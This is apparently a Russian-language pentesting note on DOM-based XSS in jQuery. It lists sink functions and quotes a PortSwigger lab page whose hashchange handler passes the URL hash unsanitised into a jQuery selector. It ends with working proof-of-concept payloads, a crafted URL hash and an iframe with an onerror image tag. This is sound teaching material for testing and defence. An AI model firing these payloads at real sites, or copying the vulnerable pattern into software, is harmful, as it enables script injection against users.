# jQuery XSS

The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:

```javascript
add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()
```

Пример уязвимости из [PortSwigger Web Academy](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event) в использовании jQuery: приложение по якорю ищет в названии постов конкретный пост и скролит страницу к выбранному месту

```markup
<div theme="blog">
    <section class="maincontainer">
        <div class="container is-page">
            <section class="blog-list">
                <div class="blog-post">
                <a href="/post?postId=1"><img src="/image/blog/posts/43.jpg"></a>
                <h2>New Year - New Friends</h2>
                <p>It's always the same. A new year begins and those people you thought were your friends go, well, a bit weird. Your nearest and dearest, between them, have a very long list of things they want to change about themselves....</p>
                <a class="button is-small" href="/post?postId=1">View post</a>
                </div>
                <div class="blog-post">
                <a href="/post?postId=2"><img src="/image/blog/posts/31.jpg"></a>
                <h2>Finding Inspiration</h2>
                <p>I don't care who you are or where you're from aren't just poignant Backstreet Boys lyrics, they also ring true in life, certainly as far as inspiration goes. We all lack drive sometimes, or perhaps we have the drive but...</p>
                <a class="button is-small" href="/post?postId=2">View post</a>
                </div>
            </section>
            <script src="https://code.jquery.com/jquery-1.8.2.js"></script>
            <script src="https://code.jquery.com/jquery-migrate-1.4.1.js"></script>
            <script>
                $(window).on('hashchange', function(){
                    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
                    if (post) post.get(0).scrollIntoView();
                });
            </script>
        </div>
    </section>
</div>
```

Линк с DOM XSS:&#x20;

```
https://server.com/#<img src=/ onerror=print()>

или через iframe:

 <iframe src="https://server.com/#" onload="this.src += '<img src=/ onerror=print()>'"></iframe>
```
